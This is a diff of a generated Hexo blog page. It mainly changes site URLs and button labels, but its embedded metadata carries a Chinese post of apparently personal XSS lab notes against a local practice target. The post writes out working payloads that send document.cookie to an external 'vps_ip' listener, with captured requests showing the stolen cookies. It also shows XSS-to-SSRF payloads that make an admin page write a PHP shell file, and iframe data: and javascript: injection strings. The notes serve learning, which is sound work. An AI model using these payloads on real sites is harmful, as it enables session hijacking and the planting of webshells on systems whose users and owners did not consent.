@@ -11,11 +11,11 @@
     
     
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"\n\n需要掌握的基础知识点\ndocument.cookie  用户cookie\nnavigator.userAgent  识别用户浏览器\nbtoa为js中的base64编码，atob为解码\n1234btoa('adsda')\"YWRzZGE=\"atob(\"YWRzZGE=\")\"adsda\"\n\n盲打no.1 可以获取想要的数据 伪造cookie等等\nno.2 如果后台有限制ip为127.0.0.1才能访问的文件，可以用xss打一个ssrf  比如这样\ndocument.createElement(“img”)\nimg.src=”http://127.0.0.1/admin.php?file=shell&amp;date=phpinfo&quot;\n创建标签document.createElement(“img”) 创建一个img标签\nimg.src=”http://vps_ip:9999/给标签的src属性赋值\n创建一个标签，然后给这个标签的属性赋值，有两种方式\n1234567var iframe = document.createElement('iframe'); iframe.src=xss;  document.body.appendChild(iframe);var iframe = document.createElement('iframe');iframe.setAttribute('src',xss);document.body.appendChild(iframe);\n\nnew Image 等效于 document.creatElement(“img”)\n123var myImage = new Image(100, 200);myImage.src = &apos;picture.jpg&apos;;document.body.appendChild(myImage);\n\n&lt;a&gt;标签1&lt;a href=\"http://vps_ip:9999/a?cookie=\"+document.cookie&gt;点击抽奖\\&lt;/a&gt;\n\n这样可以向外连VPS，但不能把cookie传出去  还没弄明白 。。\n&lt;img&gt;标签123456789101112&lt;script&gt;var img=document.createElement(\"img\");img.src=\"http://vps_ip:9999/cookie=?\"+escape(document.cookie);&lt;/script&gt;  这个可以把cookie传出来结果GET /cookie=?cookie%5Buser%5D%3Dadmin%3B%20user%3Dadmin HTTP/1.1Host: 192.168.110.1:9999User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://192.168.110.140/xss/Less-1/index.php?phone=%3Cscript%3Evar+img%3Ddocument.createElement%28%22img%22%29%3Bimg.src%3D%22http%3A%2F%2F192.168.110.1%3A9999%2Fcookie%3D%3F%22%2Bescape%28document.cookie%29%3B%3C%2Fscript%3E&amp;submit=submitDNT: 1Connection: keep-alive\n\nwindow.location12345&lt;script&gt;window.location.href=\"http://192.168.110.1:9999?cookie=\"+document.cookie; &lt;/script&gt;结果 拿到cookieGET /?cookie=cookie[user]=admin;%20user=admin HTTP/1.1Host: 192.168.110.1:9999\n\niframeiframe标签有特别多的地方可以利用\n可以使用\non+++等属性，\n还有src属性 src属性还支持data javascript等协议\n1234567891011121314151617181920212223date协议&lt;iframe src=\"data:text/html,&lt;script&gt;alert('xss')&lt;/script&gt;\"&gt;&lt;/iframe&gt;这里还可以进行一下base64编码  后面的闭合标签有没有都行&lt;iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=\"&gt; js协议&lt;iframe src=\"javascript:alert(1)\"&gt;&lt;/iframe&gt;http协议我在后台放了一个admin.php 里面写着phpinfo调用一下试试，这里得让admin来调用，要不然触发的是自己主机上的admin.php我用虚拟机访问了一下paylaod，来模拟admin可以触发phpinfo    payload1http://192.168.110.140/xss/Less-1/index.php?phone=&lt;iframe+src=\"./admin.php\"&gt;&amp;submit=submit    payload2  写全路径http://192.168.110.140/xss/Less-1/index.php?phone=&lt;iframe+src=\"http://127.0.0.1/xss/Less-1/admin.php\"&gt;&amp;submit=submit还可以去手动创建一个iframe标签，利用documentif=document.createElement(\"iframe\")if.src=http://127.0.0.1/xss/Less-1/admin.php\n\n写个shell试试img标签1?phone=&lt;script&gt;var+img=document.createElement(\"img\");img.src=\"http://192.168.110.140/xss/Less-1/admin.php?file=shell.php%26date=&lt;?php phpinfo()?&gt;\";&lt;/script&gt;\n\n访问shell.php phpinfo成功执行\n用iframe标签试试123456?phone=&lt;script&gt;var+iframe=document.createElement(\"iframe\");iframe.src=\"http://192.168.110.140/xss/Less-1/admin.php?file=shell.php%26date=&lt;?php phpinfo()?&gt;\";&lt;/script&gt;这样打不通需要把iframe添加到html中去?phone=&lt;script&gt;var+iframe=document.createElement(\"iframe\");iframe.src=\"http://192.168.110.140/xss/Less-1/admin.php?file=shell.php%26date=&lt;?php+phpinfo()?&gt;\";document.body.appendChild(iframe);&lt;/script&gt;&amp;submit=submit这样就可以\n\n这里不是很明白为什么Img标签不用添加到html中，而iframe需要添加\n12这样也是可以的?phone=&lt;iframe+src=\"http://192.168.110.140/xss/Less-1/admin.php?file=shell.php%26date=&lt;?php phpinfo()?&gt;\"&gt;&amp;submit=submit\n\n参考连接\nhttps://v0w.top/2018/08/18/XSS%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5&amp;%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/#%E5%88%9D%E6%8E%A2XSS-Payload\nhttp://www.guimaizi.com/archives/379\n","dateCreated":"2019-09-21T20:52:08+08:00","dateModified":"2019-10-16T22:20:16+08:00","datePublished":"2019-09-21T20:52:08+08:00","description":"","headline":"xss","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/21/xss/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://yoursite.com/2019/09/21/xss/"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"\n\n需要掌握的基础知识点\ndocument.cookie  用户cookie\nnavigator.userAgent  识别用户浏览器\nbtoa为js中的base64编码，atob为解码\n1234btoa('adsda')\"YWRzZGE=\"atob(\"YWRzZGE=\")\"adsda\"\n\n盲打no.1 可以获取想要的数据 伪造cookie等等\nno.2 如果后台有限制ip为127.0.0.1才能访问的文件，可以用xss打一个ssrf  比如这样\ndocument.createElement(“img”)\nimg.src=”http://127.0.0.1/admin.php?file=shell&amp;date=phpinfo&quot;\n创建标签document.createElement(“img”) 创建一个img标签\nimg.src=”http://vps_ip:9999/给标签的src属性赋值\n创建一个标签，然后给这个标签的属性赋值，有两种方式\n1234567var iframe = document.createElement('iframe'); iframe.src=xss;  document.body.appendChild(iframe);var iframe = document.createElement('iframe');iframe.setAttribute('src',xss);document.body.appendChild(iframe);\n\nnew Image 等效于 document.creatElement(“img”)\n123var myImage = new Image(100, 200);myImage.src = &apos;picture.jpg&apos;;document.body.appendChild(myImage);\n\n&lt;a&gt;标签1&lt;a href=\"http://vps_ip:9999/a?cookie=\"+document.cookie&gt;点击抽奖\\&lt;/a&gt;\n\n这样可以向外连VPS，但不能把cookie传出去  还没弄明白 。。\n&lt;img&gt;标签123456789101112&lt;script&gt;var img=document.createElement(\"img\");img.src=\"http://vps_ip:9999/cookie=?\"+escape(document.cookie);&lt;/script&gt;  这个可以把cookie传出来结果GET /cookie=?cookie%5Buser%5D%3Dadmin%3B%20user%3Dadmin HTTP/1.1Host: 192.168.110.1:9999User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://192.168.110.140/xss/Less-1/index.php?phone=%3Cscript%3Evar+img%3Ddocument.createElement%28%22img%22%29%3Bimg.src%3D%22http%3A%2F%2F192.168.110.1%3A9999%2Fcookie%3D%3F%22%2Bescape%28document.cookie%29%3B%3C%2Fscript%3E&amp;submit=submitDNT: 1Connection: keep-alive\n\nwindow.location12345&lt;script&gt;window.location.href=\"http://192.168.110.1:9999?cookie=\"+document.cookie; &lt;/script&gt;结果 拿到cookieGET /?cookie=cookie[user]=admin;%20user=admin HTTP/1.1Host: 192.168.110.1:9999\n\niframeiframe标签有特别多的地方可以利用\n可以使用\non+++等属性，\n还有src属性 src属性还支持data javascript等协议\n1234567891011121314151617181920212223date协议&lt;iframe src=\"data:text/html,&lt;script&gt;alert('xss')&lt;/script&gt;\"&gt;&lt;/iframe&gt;这里还可以进行一下base64编码  后面的闭合标签有没有都行&lt;iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=\"&gt; js协议&lt;iframe src=\"javascript:alert(1)\"&gt;&lt;/iframe&gt;http协议我在后台放了一个admin.php 里面写着phpinfo调用一下试试，这里得让admin来调用，要不然触发的是自己主机上的admin.php我用虚拟机访问了一下paylaod，来模拟admin可以触发phpinfo    payload1http://192.168.110.140/xss/Less-1/index.php?phone=&lt;iframe+src=\"./admin.php\"&gt;&amp;submit=submit    payload2  写全路径http://192.168.110.140/xss/Less-1/index.php?phone=&lt;iframe+src=\"http://127.0.0.1/xss/Less-1/admin.php\"&gt;&amp;submit=submit还可以去手动创建一个iframe标签，利用documentif=document.createElement(\"iframe\")if.src=http://127.0.0.1/xss/Less-1/admin.php\n\n写个shell试试img标签1?phone=&lt;script&gt;var+img=document.createElement(\"img\");img.src=\"http://192.168.110.140/xss/Less-1/admin.php?file=shell.php%26date=&lt;?php phpinfo()?&gt;\";&lt;/script&gt;\n\n访问shell.php phpinfo成功执行\n用iframe标签试试123456?phone=&lt;script&gt;var+iframe=document.createElement(\"iframe\");iframe.src=\"http://192.168.110.140/xss/Less-1/admin.php?file=shell.php%26date=&lt;?php phpinfo()?&gt;\";&lt;/script&gt;这样打不通需要把iframe添加到html中去?phone=&lt;script&gt;var+iframe=document.createElement(\"iframe\");iframe.src=\"http://192.168.110.140/xss/Less-1/admin.php?file=shell.php%26date=&lt;?php+phpinfo()?&gt;\";document.body.appendChild(iframe);&lt;/script&gt;&amp;submit=submit这样就可以\n\n这里不是很明白为什么Img标签不用添加到html中，而iframe需要添加\n12这样也是可以的?phone=&lt;iframe+src=\"http://192.168.110.140/xss/Less-1/admin.php?file=shell.php%26date=&lt;?php phpinfo()?&gt;\"&gt;&amp;submit=submit\n\n参考连接\nhttps://v0w.top/2018/08/18/XSS%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5&amp;%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/#%E5%88%9D%E6%8E%A2XSS-Payload\nhttp://www.guimaizi.com/archives/379\n","dateCreated":"2019-09-21T20:52:08+08:00","dateModified":"2019-10-16T22:20:16+08:00","datePublished":"2019-09-21T20:52:08+08:00","description":"","headline":"xss","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://p1keman.github.io/2019/09/21/xss/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://p1keman.github.io/2019/09/21/xss/"}</script>
     <meta name="description" content="需要掌握的基础知识点 document.cookie  用户cookie navigator.userAgent  识别用户浏览器 btoa为js中的base64编码，atob为解码 1234btoa(&apos;adsda&apos;)&quot;YWRzZGE=&quot;atob(&quot;YWRzZGE=&quot;)&quot;adsda&quot;  盲打no.1 可以获取想要的数据 伪造cookie等等 no.2 如果后台有限制ip为127.0.0.1才能">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="xss">
-<meta property="og:url" content="http://yoursite.com/2019/09/21/xss/index.html">
+<meta property="og:url" content="http://p1keman.github.io/2019/09/21/xss/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="需要掌握的基础知识点 document.cookie  用户cookie navigator.userAgent  识别用户浏览器 btoa为js中的base64编码，atob为解码 1234btoa(&apos;adsda&apos;)&quot;YWRzZGE=&quot;atob(&quot;YWRzZGE=&quot;)&quot;adsda&quot;  盲打no.1 可以获取想要的数据 伪造cookie等等 no.2 如果后台有限制ip为127.0.0.1才能">
 <meta property="og:locale" content="zh-cn">
@@ -294,7 +294,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -305,7 +305,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/21/xss/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/21/xss/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -318,7 +318,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/21/xss/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/21/xss/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -331,7 +331,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/21/xss/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/21/xss/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -344,7 +344,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -409,7 +409,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -420,7 +420,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/21/xss/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/21/xss/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -433,7 +433,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/21/xss/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/21/xss/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -446,7 +446,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/21/xss/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/21/xss/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -459,7 +459,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -480,7 +480,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/21/xss/"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/21/xss/"
                         aria-label="分享到 Facebook"
                     >
                         <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
@@ -493,7 +493,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/21/xss/"
+                        href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/21/xss/"
                         aria-label="分享到 Twitter"
                     >
                         <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
@@ -506,7 +506,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://plus.google.com/share?url=http://yoursite.com/2019/09/21/xss/"
+                        href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/21/xss/"
                         aria-label="分享到 Google+"
                     >
                         <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
